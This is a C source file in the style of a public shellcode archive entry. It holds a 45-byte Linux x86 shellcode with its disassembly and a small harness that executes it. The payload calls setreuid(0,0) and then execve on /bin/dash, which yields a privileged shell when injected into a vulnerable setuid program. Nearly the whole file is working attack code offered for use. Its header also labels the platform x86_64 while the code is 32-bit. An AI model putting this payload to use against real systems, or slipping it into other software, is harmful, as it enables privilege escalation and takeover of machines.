/*
# Title: Linux/x86 exec('/bin/dash') - shellcode 45 bytes
# Platform: linux/x86_64
# Date: 2015-06-15
# Author: Mohammad Reza Espargham
#    Linkedin    :   https://ir.linkedin.com/in/rezasp
#    E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
#    Website     :   www.reza.es
#    Twitter     :   https://twitter.com/rezesp
#    FaceBook    :   https://www.facebook.com/mohammadreza.espargham


Disassembly of section .text:

00000000 <.text>:
   0:	b0 46                	mov    $0x46,%al
   2:	31 db                	xor    %ebx,%ebx
   4:	31 c9                	xor    %ecx,%ecx
   6:	cd 80                	int    $0x80
   8:	68 90 90 90 68       	push   $0x68909090
   d:	58                   	pop    %eax
   e:	c1 e8 10             	shr    $0x10,%eax
  11:	c1 e8 08             	shr    $0x8,%eax
  14:	50                   	push   %eax
  15:	68 2f 64 61 73       	push   $0x7361642f
  1a:	68 2f 62 69 6e       	push   $0x6e69622f
  1f:	89 e3                	mov    %esp,%ebx
  21:	31 c0                	xor    %eax,%eax
  23:	b0 0b                	mov    $0xb,%al
  25:	cd 80                	int    $0x80
  27:	b0 01                	mov    $0x1,%al
  29:	b3 01                	mov    $0x1,%bl
  2b:	cd 80                	int    $0x80
*/

#include <stdio.h>
#include <string.h>
int main(){
unsigned char shellcode[]= "\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x90\x90\x90\x68\x58\xc1\xe8\x10\xc1\xe8\x08\x50\x68\x2f\x64\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}